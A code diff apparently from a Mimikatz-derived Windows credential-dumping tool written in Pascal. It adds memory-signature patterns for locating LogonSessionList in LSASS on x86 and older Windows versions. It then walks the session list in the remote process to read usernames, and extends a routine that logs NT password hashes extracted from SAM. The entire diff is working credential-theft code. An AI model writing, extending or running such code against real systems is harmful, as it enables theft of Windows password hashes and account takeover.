@@ -292,8 +292,9 @@ const
   // Signature used to find l_LogSessList (PTRN_WIN6_PasswdSet from Mimikatz)
   PTRN_WIN5_PasswdSet:array [0..3] of byte=  ($48, $3b, $da, $74);
   PTRN_WIN6_PasswdSet:array [0..3] of byte=  ($48, $3b, $d9, $74);
+  PTRN_WIN5_PasswdSet_X86:array [0..6] of byte= ($74, $18, $8b, $4d, $08, $8b, $11);
 var
-  dummy:string;
+  dummy,temp:string;
   hprocess,hmod:thandle;
   hmods:array[0..1023] of thandle;
   MODINFO:  MODULEINFO;
@@ -307,14 +308,24 @@ var
   patch_pos:ShortInt=0;
   pattern:array of byte;
   logsesslist:array [0..sizeof(i_logsesslist)-1] of byte;
+  bytes:array[0..254] of byte;
+  username:array [0..254] of widechar;
 begin
   if pid=0 then exit;
   //if user='' then exit;
   //
   if (lowercase(osarch)='amd64') then
      begin
-     setlength(pattern,sizeof(PTRN_WIN6_PasswdSet));
-     copymemory(@pattern[0],@PTRN_WIN6_PasswdSet[0],sizeof(PTRN_WIN6_PasswdSet));
+     if copy(winver,1,2)='5' then
+        begin
+        setlength(pattern,sizeof(PTRN_WIN5_PasswdSet));
+        copymemory(@pattern[0],@PTRN_WIN5_PasswdSet[0],sizeof(PTRN_WIN5_PasswdSet));
+        end
+        else
+        begin
+        setlength(pattern,sizeof(PTRN_WIN6_PasswdSet));
+        copymemory(@pattern[0],@PTRN_WIN6_PasswdSet[0],sizeof(PTRN_WIN6_PasswdSet));
+        end;
      //{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}}
      patch_pos:=23;
      //{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList},	{0, NULL}, {36,  -6}},
@@ -324,7 +335,12 @@ begin
      //{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_PasswdSet),	PTRN_WIN6_PasswdSet},	{0, NULL}, {-4, 48}},
      patch_pos:=-4;
      end;
-  //x86 to do...
+  if (lowercase(osarch)='x86') then
+     begin
+        setlength(pattern,sizeof(PTRN_WIN5_PasswdSet_X86));
+        copymemory(@pattern[0],@PTRN_WIN5_PasswdSet_X86[0],sizeof(PTRN_WIN5_PasswdSet_X86));
+     end;
+
   if patch_pos =0 then
      begin
      log('no patch mod for this windows version',1);
@@ -370,10 +386,34 @@ begin
                                    CopyMemory(@offset_list_dword,@offset_list[0],4);
                                    log('ReadProcessMemory OK '+inttohex(offset_list_dword+4,4));
                                    //we now should get a match with .load lsrsrv.dll then dd Lsasrv!LogonSessionList
-                                   log(inttohex(offset+offset_list_dword+4+patch_pos,sizeof(pointer)),0);
-                                   //read sesslist at position
-                                   ReadMem  (hprocess,offset+offset_list_dword+4+patch_pos,logsesslist );
-                                   log(inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).next).highPart,sizeof(pointer))+inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).next).LowPart ,sizeof(pointer)),0) ;
+                                   //new offset to the list entry
+                                   offset:= offset+offset_list_dword+4+patch_pos;
+                                   log(leftpad(inttohex(offset,sizeof(pointer)),16,'0'),1);
+                                   //writeln(strtoint64('$'+leftpad(inttohex(offset,sizeof(pointer)),16,'0')));
+                                   //read sesslist at offset
+                                   ReadMem  (hprocess,offset,logsesslist );
+                                   {$ifdef CPU64}
+                                   dummy:=inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).next).highPart,sizeof(pointer))+inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).next).LowPart ,sizeof(pointer));
+                                   {$endif CPU64}
+                                   //again...
+                                   while dummy<>leftpad(inttohex(offset,sizeof(pointer)),16,'0') do
+                                   begin
+                                   log('entry#n:'+dummy,0) ;
+                                   //get username and luid
+                                   {$ifdef CPU64}
+                                   temp:=inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).usernameptr).highPart,sizeof(pointer))+inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).usernameptr).LowPart ,sizeof(pointer));
+                                   {$endif CPU64}
+                                   ReadMem  (hprocess,strtoint64('$'+temp),bytes );
+                                   copymemory(@username[0],@bytes[0],64);
+                                   log('username:'+widestring(username));
+                                   //next
+                                   ReadMem  (hprocess,strtoint64('$'+dummy),logsesslist );
+                                   {$ifdef CPU64}
+                                   dummy:=inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).next).highPart,sizeof(pointer))+inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).next).LowPart ,sizeof(pointer));
+                                    {$endif CPU64}
+                                   end;
+                                   //...
+
                                    end; //if readmem
                                  end;
                             {//test - lets read first 4 bytes of our module
@@ -432,9 +472,17 @@ var
   bytes:tbyte16;
   username:string;
 begin
+  try
   if dumphash(psamuser(param).samkey,psamuser(param).rid,bytes,username)
-     then log('NTHASH:'+username+':'+inttostr(psamuser(param).rid)+'::'+HashByteToString(bytes) ,1)
-     else log('gethash NOT OK for '+username ,1);
+          then log('NTHASH:'+username+':'+inttostr(psamuser(param).rid)+'::'+HashByteToString(bytes) ,1)
+          else log('gethash NOT OK for '+inttohex(psamuser(param).rid,8)+':'+username ,1);
+  except
+    on e:exception do
+    begin
+      if e.ClassName ='EAccessViolation' then log('NTHASH:'+username+':'+inttostr(psamuser(param).rid)+'::'+HashByteToString(bytes) ,1);
+      log(e.Message ,0); //SHAME!!!!!!!!!!!!!!
+    end;
+  end;
 end;
 
 
